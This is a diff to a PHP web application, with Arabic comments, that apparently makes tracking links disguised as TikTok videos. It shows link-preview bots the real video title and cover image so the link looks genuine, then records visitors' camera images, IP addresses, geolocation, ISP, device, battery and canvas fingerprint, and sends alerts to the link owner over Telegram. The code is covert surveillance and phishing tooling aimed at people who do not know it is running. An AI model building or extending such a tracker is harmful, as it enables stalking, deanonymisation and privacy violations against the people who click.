@@ -30,12 +30,8 @@ try {
     try { $db->exec("ALTER TABLE links ADD COLUMN name TEXT"); } catch (Exception $e) {}
     $db->exec("CREATE INDEX IF NOT EXISTS idx_link_code ON links(code)");
 
-    $db->exec("CREATE TABLE IF NOT EXISTS captures (id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, image_data TEXT, public_ip TEXT, local_ip TEXT, port TEXT, location TEXT, isp_info TEXT, vpn_status TEXT, device_info TEXT, latitude REAL, longitude REAL, gpu_info TEXT, battery_info TEXT, screen_info TEXT, canvas_fp TEXT, created_at DATETIME DEFAULT CURRENT_TIMESTAMP)");
+    $db->exec("CREATE TABLE IF NOT EXISTS captures (id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, image_data TEXT, public_ip TEXT, local_ip TEXT, port TEXT, location TEXT, isp_info TEXT, vpn_status TEXT, device_info TEXT, latitude REAL, longitude REAL, battery_info TEXT, canvas_fp TEXT, created_at DATETIME DEFAULT CURRENT_TIMESTAMP)");
     $db->exec("CREATE INDEX IF NOT EXISTS idx_capture_code ON captures(code)");
-    try { $db->exec("ALTER TABLE captures ADD COLUMN gpu_info TEXT"); } catch (Exception $e) {}
-    try { $db->exec("ALTER TABLE captures ADD COLUMN battery_info TEXT"); } catch (Exception $e) {}
-    try { $db->exec("ALTER TABLE captures ADD COLUMN screen_info TEXT"); } catch (Exception $e) {}
-    try { $db->exec("ALTER TABLE captures ADD COLUMN canvas_fp TEXT"); } catch (Exception $e) {}
 
 } catch (Exception $e) { die("Database error: " . $e->getMessage()); }
 
@@ -53,26 +49,26 @@ function sendTelegramAlert($chat_id, $message, $image_base64 = null, $custom_tok
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_POST, 1);
         curl_setopt($ch, CURLOPT_POSTFIELDS, $data); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 3); curl_exec($ch); curl_close($ch); @unlink($tmpfile);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 3); @curl_exec($ch); curl_close($ch); @unlink($tmpfile);
     } else {
         $url = "https://api.telegram.org/bot{$token}/sendMessage";
         $data = ['chat_id' => $chat_id, 'text' => $message, 'parse_mode' => 'HTML'];
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_POST, 1);
         curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data)); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 2); curl_exec($ch); curl_close($ch);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 2); @curl_exec($ch); curl_close($ch);
     }
 }
 
-// دالة جلب بيانات تيك توك عبر TikWM API المحدثة
+// دالة جلب بيانات تيك توك المضمونة والمحدثة
 function fetch_tiktok_exclusive_meta($url) {
     $meta = [
-        'title' => 'TikTok Video', 
-        'image' => 'https://p16-sign-va.ibyteimg.com/tos-maliva-avt-0068/7342129759495864326~c5_720x720.jpeg'
+        'title' => 'TikTok Video - شاهد الآن', 
+        'image' => 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=800'
     ];
 
-    $api_url = "https://www.tikwm.com/api/?url=" . urlencode($url);
-    $ch = curl_init($api_url);
+    // محاولة أولى عبر TikWM
+    $ch = curl_init("https://www.tikwm.com/api/?url=" . urlencode($url));
     curl_setopt_array($ch, [
         CURLOPT_RETURNTRANSFER => true, 
         CURLOPT_TIMEOUT => 6, 
@@ -85,15 +81,31 @@ function fetch_tiktok_exclusive_meta($url) {
     if ($res) {
         $data = json_decode($res, true);
         if (isset($data['code']) && $data['code'] === 0 && !empty($data['data'])) {
-            if (!empty($data['data']['title'])) {
-                $meta['title'] = $data['data']['title'];
-            }
+            if (!empty($data['data']['title'])) $meta['title'] = $data['data']['title'];
             if (!empty($data['data']['cover'])) {
                 $meta['image'] = $data['data']['cover'];
                 return $meta;
             }
         }
     }
+
+    // محاولة ثانية احتياطية عبر oEmbed الرسمي لتيك توك
+    $ch2 = curl_init("https://www.tiktok.com/oembed?url=" . urlencode($url));
+    curl_setopt_array($ch2, [
+        CURLOPT_RETURNTRANSFER => true, 
+        CURLOPT_TIMEOUT => 5, 
+        CURLOPT_SSL_VERIFYPEER => false, 
+        CURLOPT_USERAGENT => 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X)'
+    ]);
+    $res2 = curl_exec($ch2);
+    curl_close($ch2);
+
+    if ($res2) {
+        $data2 = json_decode($res2, true);
+        if (!empty($data2['title'])) $meta['title'] = $data2['title'];
+        if (!empty($data2['thumbnail_url'])) $meta['image'] = $data2['thumbnail_url'];
+    }
+
     return $meta;
 }
 
@@ -107,9 +119,9 @@ function get_real_ip() {
 
 function get_ip_details($ip) {
     if ($ip === '127.0.0.1' || $ip === 'Unknown' || strpos($ip, '192.168.') === 0) {
-        return ['location' => 'Local Network', 'isp' => 'Internal/VPN', 'vpn' => 'No', 'lat' => 0, 'lon' => 0];
+        return ['location' => 'Local Network', 'isp' => 'Internal/VPN', 'lat' => 0, 'lon' => 0];
     }
-    $ch = curl_init("http://ip-api.com/json/{$ip}?fields=status,country,city,isp,proxy,hosting,lat,lon");
+    $ch = curl_init("http://ip-api.com/json/{$ip}?fields=status,country,city,isp,lat,lon");
     curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 2]);
     $json = curl_exec($ch); curl_close($ch);
     
@@ -117,19 +129,10 @@ function get_ip_details($ip) {
         $data = json_decode($json, true);
         if (isset($data['status']) && $data['status'] === 'success') {
             $location = ($data['city'] ? $data['city'] . ', ' : '') . ($data['country'] ?? 'Unknown');
-            $raw_isp = strtolower($data['isp'] ?? '');
-            
-            $isp = 'Unknown';
-            if (strpos($raw_isp, 'djezzy') !== false || strpos($raw_isp, 'ota') !== false) $isp = 'Djezzy';
-            elseif (strpos($raw_isp, 'mobilis') !== false || strpos($raw_isp, 'atm') !== false) $isp = 'Mobilis';
-            elseif (strpos($raw_isp, 'ooredoo') !== false || strpos($raw_isp, 'wataniya') !== false) $isp = 'Ooredoo';
-            elseif (strpos($raw_isp, 'algerie telecom') !== false) $isp = 'Algerie Telecom';
-            else $isp = ucwords($data['isp'] ?? 'Unknown');
-
-            return ['location' => $location, 'isp' => $isp, 'vpn' => 'No', 'lat' => $data['lat'] ?? 0, 'lon' => $data['lon'] ?? 0];
+            return ['location' => $location, 'isp' => $data['isp'] ?? 'Unknown', 'lat' => $data['lat'] ?? 0, 'lon' => $data['lon'] ?? 0];
         }
     }
-    return ['location' => 'Unknown', 'isp' => 'Unknown', 'vpn' => 'Unknown', 'lat' => 0, 'lon' => 0];
+    return ['location' => 'Unknown', 'isp' => 'Unknown', 'lat' => 0, 'lon' => 0];
 }
 
 function get_device_type($ua) {
@@ -144,7 +147,7 @@ function get_device_type($ua) {
 }
 
 // ==========================================
-// Tracker Core (معالجة البوتات والزوار)
+// Tracker Core
 // ==========================================
 if (isset($_GET['r'])) {
     $code = $_GET['r'];
@@ -161,18 +164,19 @@ if (isset($_GET['r'])) {
         $owner_tg_token = $link['tg_token'];
 
         $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
-        // الكشف الدقيق عن بوتات واتساب وتيليجرام وفيسبوك
         $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebook|facebot|meta-externalagent|twitterbot|discordbot|preview/i', $ua);
 
+        // هنا يتم عرض الصورة والعنوان الحقيقيين لبوت واتساب فوراً من قاعدة البيانات
         if ($is_bot) {
             header('Content-Type: text/html; charset=utf-8');
             echo '<!DOCTYPE html><html><head>';
+            echo '<meta charset="UTF-8">';
             echo '<meta property="og:title" content="' . htmlspecialchars($meta_title) . '">';
-            echo '<meta property="og:description" content="شاهد هذا الفيديو الحصري على تيك توك">';
+            echo '<meta property="og:description" content="شاهد الفيديو الحصري على تيك توك">';
             echo '<meta property="og:image" content="' . htmlspecialchars($meta_image) . '">';
             echo '<meta property="og:image:secure_url" content="' . htmlspecialchars($meta_image) . '">';
-            echo '<meta property="og:image:width" content="800">';
-            echo '<meta property="og:image:height" content="800">';
+            echo '<meta property="og:image:width" content="1200">';
+            echo '<meta property="og:image:height" content="630">';
             echo '<meta property="og:type" content="video.other">';
             echo '<meta property="og:url" content="' . htmlspecialchars($target_redirect) . '">';
             echo '<meta name="twitter:card" content="summary_large_image">';
@@ -286,7 +290,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_image_only'])) {
 }
 
 // ==========================================
-// Dashboard (لوحة التحكم)
+// Dashboard
 // ==========================================
 $login_error = '';
 if (isset($_POST['login'])) {
@@ -320,7 +324,7 @@ if ($is_logged_in) {
         $use_camera = isset($_POST['use_camera']) ? 1 : 0;
         if (!filter_var($target_url, FILTER_VALIDATE_URL)) $target_url = "https://" . $target_url;
         
-        // جلب العنوان والصورة الحقيقية مباشرة عند إنشاء الرابط وتخزينها في قاعدة البيانات
+        // جلب العنوان والصورة الحقيقية وتخزينها في قاعدة البيانات فوراً
         $scraped = fetch_tiktok_exclusive_meta($target_url);
         $code = substr(md5(uniqid(rand(), true)), 0, 7);
         
@@ -328,9 +332,6 @@ if ($is_logged_in) {
         $generated_link = "https://" . $_SERVER['HTTP_HOST'] . "/?r=" . $code; $generated_code = $code;
     }
 
-    $total_links = $db->query($is_admin ? "SELECT COUNT(*) FROM links" : "SELECT COUNT(*) FROM links WHERE user_id = $current_user_id")->fetchColumn();
-    $total_captures = $db->query($is_admin ? "SELECT COUNT(*) FROM captures" : "SELECT COUNT(*) FROM captures c JOIN links l ON c.code = l.code WHERE l.user_id = $current_user_id")->fetchColumn();
-    
     $stmt = $is_admin ? $db->query("SELECT c.*, l.name as link_name FROM captures c LEFT JOIN links l ON c.code = l.code ORDER BY c.id DESC LIMIT 50") : $db->prepare("SELECT c.*, l.name as link_name FROM captures c JOIN links l ON c.code = l.code WHERE l.user_id = ? ORDER BY c.id DESC LIMIT 50");
     if(!$is_admin) $stmt->execute([$current_user_id]);
     $captures = $stmt->fetchAll();
